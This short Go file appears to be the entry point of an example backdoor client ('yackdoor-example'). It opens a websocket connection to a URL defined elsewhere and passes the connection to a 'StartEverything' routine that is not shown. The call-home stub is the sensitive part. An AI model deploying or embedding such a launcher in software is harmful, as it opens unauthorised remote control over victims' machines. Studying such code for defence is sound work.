package main

import (
	"log"

	"github.com/bruh-boys/yackdoor-example/Communicate"
	"golang.org/x/net/websocket"
)

func main() {

	conn, err := websocket.Dial(Communicate.Url, "", Communicate.Origin)
	if err != nil {
		log.Fatal(err)

	}
	Communicate.StartEverything(conn)
}
